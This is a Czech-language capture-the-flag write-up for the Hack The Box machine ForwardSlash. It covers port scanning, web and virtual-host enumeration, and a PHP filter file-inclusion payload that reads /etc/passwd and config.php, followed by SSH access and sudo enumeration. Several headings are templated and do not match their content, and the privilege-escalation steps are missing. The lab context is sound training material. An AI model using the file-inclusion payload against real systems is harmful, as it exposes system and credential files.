---
layout: post
author: Tomáš Matějíček
title: "ForwardSlash"
date: 2020-11-29
tags: linux lfi rce ssh sudo php
---
[ForwardSlash](https://www.hackthebox.eu/home/machines/profile/239) je stroj z Hack The Box. Klíčová část útoku je webová enumerace a praktické zneužití nalezené slabiny.

### Vyhledání otevřených portů
Nejdřív mapuji služby, které jsou dostupné zvenku.
`ports=$(nmap -p- --min-rate=1000 -T4 $IP | grep ^[0-9] | cut -d "/" -f 1 | tr "\n" "," | sed s/,$//);echo $ports;nmap -p $ports -A -sC -sV -v $IP`

### Přihlášení na cíl
Po získání přihlašovacích údajů přecházím na stabilní shell na cílovém stroji.
`22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)`
```
| ssh-hostkey:
|   2048 3c:3b:eb:54:96:81:1d:da:d7:96:c7:0f:b4:7e:e1:cf (RSA)
|   256 f6:b3:5f:a2:59:e3:1e:57:35:36:c3:fe:5e:3d:1f:66 (ECDSA)
|_  256 1b:de:b8:07:35:e8:18:2c:19:d8:cc:dd:77:9c:f2:5e (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Did not follow redirect to http://forwardslash.htb
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Enumerace webu
Procházím web a hledám skryté cesty, které nejsou dostupné z hlavní stránky.
`dirb http://forwardslash.htb -X ,.php,.txt,.log,.xml`
```
=> + http://forwardslash.htb/note.txt (CODE:200|SIZE:216)
```

### Enumerace webu (2)
Procházím web a hledám skryté cesty, které nejsou dostupné z hlavní stránky.
`wfuzz -H "Host: FUZZ.forwardslash.htb" -w /usr/share/wordlists/wfuzz/general/common.txt --hh 0 http://$IP`
```
=> backup.forwardslash.htb

./dirsearch/dirsearch.py -u http://backup.forwardslash.htb -e php -x 403 -r
=> http://backup.forwardslash.htb/dev/
```

### Spuštění exploitu
Zde dochází k praktickému zneužití zranitelnosti.
`curl -F "url=php://filter/convert.base64-encode/resource=/etc/passwd" -H "Cookie: PHPSESSID=tt2u04m6a1pb9vavplb2e88vvt;" http://backup.forwardslash.htb/api.php | base64 -d -`
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
```

### Spuštění exploitu (2)
Zde dochází k praktickému zneužití zranitelnosti.
`php://filter/convert.base64-encode/resource=config.php`

### Přihlášení na cíl (2)
Po získání přihlašovacích údajů přecházím na stabilní shell na cílovém stroji.
`ssh chiv@forwardslash.htb`

### Získání user flagu
Tímto potvrzuji úspěšný uživatelský přístup.
`cat user.txt`
```
__CENSORED__
```

### Průzkum možností eskalace
Hledám chybné konfigurace a cesty k vyšším oprávněním.
`sudo -l`
```
    (root) NOPASSWD: __CENSORED__ luksOpen *
    (root) NOPASSWD: __CENSORED__ /dev/mapper/backup ./mnt/
    (root) NOPASSWD: __CENSORED__ ./mnt/
```

### Získání root flagu
Tímto potvrzuji úplné ovládnutí stroje.
`cat root.txt`
```
__CENSORED__
```
